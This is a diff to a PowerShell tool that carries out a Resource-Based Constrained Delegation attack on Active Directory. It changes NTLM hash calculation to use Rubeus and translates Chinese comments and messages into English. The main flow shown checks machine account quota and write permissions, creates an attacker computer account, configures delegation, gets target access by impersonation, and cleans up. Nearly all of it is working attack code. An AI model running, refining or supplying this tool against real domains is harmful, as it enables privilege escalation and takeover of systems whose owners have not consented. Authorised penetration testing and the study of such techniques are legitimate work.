@@ -205,30 +205,22 @@ function Get-TargetAccess {
     try {
         Write-Host "[*] Using Rubeus to get target access..." -ForegroundColor Yellow
         
-        # Calculate NTLM hash
-        $ntlmHash = Invoke-Command -ScriptBlock {
-            Add-Type -AssemblyName System.Security
-            $passwordBytes = [System.Text.Encoding]::Unicode.GetBytes($using:Password)
-            $md4 = New-Object System.Security.Cryptography.MD4CryptoServiceProvider
-            $hashBytes = $md4.ComputeHash($passwordBytes)
-            $ntlmHash = [System.BitConverter]::ToString($hashBytes).Replace("-", "").ToLower()
-            return $ntlmHash
+        # Use Rubeus to calculate the NTLM hash instead of using Invoke-Command
+        Write-Host "[*] Using Rubeus to calculate NTLM hash..." -ForegroundColor Yellow
+        $hashOutput = & $RubeusPath hash /password:$Password
+        
+        # Extract hash from output
+        $ntlmHash = $null
+        foreach ($line in $hashOutput) {
+            if ($line -match "rc4_hmac\s+:\s+([0-9A-F]+)") {
+                $ntlmHash = $Matches[1]
+                break
+            }
         }
         
         if (-not $ntlmHash) {
-            # If built-in method fails, use Rubeus hash to calculate hash
-            Write-Host "[*] Using Rubeus to calculate NTLM hash..." -ForegroundColor Yellow
-            $hashOutput = & $RubeusPath hash /password:$Password
-            
-            # Extract hash from output
-            $ntlmHash = $hashOutput | Select-String "rc4_hmac" | Select-Object -First 1
-            if ($ntlmHash -match "rc4_hmac\s+:\s+([0-9A-F]+)") {
-                $ntlmHash = $Matches[1]
-            }
-            else {
-                Write-Error "Unable to calculate NTLM hash using Rubeus"
-                return $false
-            }
+            Write-Error "Unable to calculate NTLM hash using Rubeus"
+            return $false
         }
         
         Write-Host "[+] Computer account NTLM hash: $ntlmHash" -ForegroundColor Green
@@ -285,28 +277,28 @@ function Get-TargetAccess {
 
 function Cleanup-RBCD {
     try {
-        Write-Host "[*] 正在清理..." -ForegroundColor Yellow
+        Write-Host "[*] Cleaning up..." -ForegroundColor Yellow
         
-        # 1. 重置目标计算机的msDS-AllowedToActOnBehalfOfOtherIdentity属性
-        Write-Host "[*] 重置目标计算机的RBCD配置..." -ForegroundColor Yellow
+        # 1. Reset target computer's msDS-AllowedToActOnBehalfOfOtherIdentity attribute
+        Write-Host "[*] Resetting target computer's RBCD configuration..." -ForegroundColor Yellow
         Get-DomainComputer -Identity $TargetComputer | 
             Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'
         
-        # 验证清理
+        # Verify cleanup
         $targetComputer = Get-DomainComputer -Identity $TargetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'
         $rbcdValue = $targetComputer | Select-Object -ExpandProperty msds-allowedtoactonbehalfofotheridentity
         
         if (-not $rbcdValue) {
-            Write-Host "[+] 目标计算机RBCD配置已重置" -ForegroundColor Green
+            Write-Host "[+] Target computer RBCD configuration has been reset" -ForegroundColor Green
         }
         else {
-            Write-Host "[!] 警告: 目标计算机RBCD配置未能完全重置" -ForegroundColor Red
+            Write-Host "[!] Warning: Target computer RBCD configuration could not be fully reset" -ForegroundColor Red
         }
         
-        # 2. 删除创建的计算机账户
-        Write-Host "[*] 删除创建的计算机账户 $AttackerComputer ..." -ForegroundColor Yellow
+        # 2. Delete created computer account
+        Write-Host "[*] Deleting created computer account $AttackerComputer ..." -ForegroundColor Yellow
         
-        # 使用ADSI删除计算机账户
+        # Use ADSI to delete computer account
         $computerDN = (Get-DomainComputer -Identity $AttackerComputer).distinguishedname
         if ($computerDN) {
             $root = New-Object System.DirectoryServices.DirectoryEntry("LDAP://RootDSE")
@@ -315,90 +307,90 @@ function Cleanup-RBCD {
             $deleteEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$computerDN")
             $adsi.Children.Remove($deleteEntry)
             
-            # 验证删除
+            # Verify deletion
             $verifyDelete = Get-DomainComputer -Identity $AttackerComputer -ErrorAction SilentlyContinue
             if (-not $verifyDelete) {
-                Write-Host "[+] 计算机账户已成功删除" -ForegroundColor Green
+                Write-Host "[+] Computer account successfully deleted" -ForegroundColor Green
             }
             else {
-                Write-Host "[!] 警告: 计算机账户未能成功删除" -ForegroundColor Red
+                Write-Host "[!] Warning: Computer account could not be successfully deleted" -ForegroundColor Red
             }
         }
         else {
-            Write-Host "[!] 找不到计算机账户 $AttackerComputer，可能已被删除" -ForegroundColor Yellow
+            Write-Host "[!] Could not find computer account $AttackerComputer, it may already be deleted" -ForegroundColor Yellow
         }
         
-        # 3. 清理票据
-        Write-Host "[*] 清理Kerberos票据..." -ForegroundColor Yellow
+        # 3. Clean up tickets
+        Write-Host "[*] Cleaning up Kerberos tickets..." -ForegroundColor Yellow
         klist purge | Out-Null
-        Write-Host "[+] 票据已清理" -ForegroundColor Green
+        Write-Host "[+] Tickets have been purged" -ForegroundColor Green
         
-        Write-Host "[+] 清理完成" -ForegroundColor Green
+        Write-Host "[+] Cleanup complete" -ForegroundColor Green
         return $true
     }
     catch {
-        Write-Error "清理过程中出错: $_"
+        Write-Error "Error during cleanup process: $_"
         return $false
     }
 }
 
-# 主执行流程
+# Main execution flow
 function Execute-RBCDAttack {
-    # 检查模块和工具
+    # Check modules and tools
     if (-not (Test-ModulesLoaded)) {
-        Write-Error "所需模块或工具未加载，无法继续"
+        Write-Error "Required modules or tools not loaded, cannot continue"
         return
     }
     
-    # 显示设置信息
-    Write-Host "=== Resource-Based Constrained Delegation (RBCD) 攻击 ===" -ForegroundColor Cyan
-    Write-Host "目标计算机: $TargetComputer" -ForegroundColor Cyan
-    Write-Host "攻击者计算机: $AttackerComputer" -ForegroundColor Cyan
-    Write-Host "目标域: $Domain" -ForegroundColor Cyan
-    Write-Host "模拟用户: $ImpersonateUser" -ForegroundColor Cyan
-    Write-Host "目标服务: $Service" -ForegroundColor Cyan
+    # Display settings information
+    Write-Host "=== Resource-Based Constrained Delegation (RBCD) Attack ===" -ForegroundColor Cyan
+    Write-Host "Target Computer: $TargetComputer" -ForegroundColor Cyan
+    Write-Host "Attacker Computer: $AttackerComputer" -ForegroundColor Cyan
+    Write-Host "Target Domain: $Domain" -ForegroundColor Cyan
+    Write-Host "Impersonate User: $ImpersonateUser" -ForegroundColor Cyan
+    Write-Host "Target Service: $Service" -ForegroundColor Cyan
     Write-Host "============================================" -ForegroundColor Cyan
     
-    # 如果是清理模式，直接执行清理
+    # If cleanup mode, just execute cleanup
     if ($Cleanup) {
         Cleanup-RBCD
         return
     }
     
-    # 检查机器账户配额
+    # Check machine account quota
     if (-not (Check-MachineAccountQuota)) {
         return
     }
     
-    # 检查目标计算机的写权限
+    # Check target computer's write permissions
     if (-not (Check-TargetWritePermission)) {
         return
     }
     
-    # 如果只验证权限，到这里就返回
+    # If only verifying permissions, return here
     if ($VerifyOnly) {
-        Write-Host "[+] 验证模式: 当前用户对目标计算机有必要的权限，RBCD攻击可行" -ForegroundColor Green
+        Write-Host "[+] Verify mode: Current user has necessary permissions on target computer, RBCD attack is feasible" -ForegroundColor Green
         return
     }
     
-    # 创建攻击者计算机账户
+    # Create attacker computer account
     if (-not (Create-AttackerComputer)) {
         return
     }
     
-    # 配置RBCD
+    # Configure RBCD
     if (-not (Configure-RBCD)) {
         return
     }
     
-    # 获取目标访问权限
+    # Get target access
     if (-not (Get-TargetAccess)) {
         return
     }
     
-    Write-Host "[+] RBCD攻击成功完成!" -ForegroundColor Green
-    Write-Host "[*] 要清理所有更改，请运行: $($MyInvocation.MyCommand.Name) -TargetComputer $TargetComputer -AttackerComputer $AttackerComputer -Cleanup" -ForegroundColor Yellow
+    Write-Host "[+] RBCD attack successfully completed!" -ForegroundColor Green
+    Write-Host "[*] To clean up all changes, run: $($MyInvocation.MyCommand.Name) -TargetComputer $TargetComputer -AttackerComputer $AttackerComputer -Cleanup" -ForegroundColor Yellow
 }
 
-# 执行攻击
+# Execute attack
 Execute-RBCDAttack
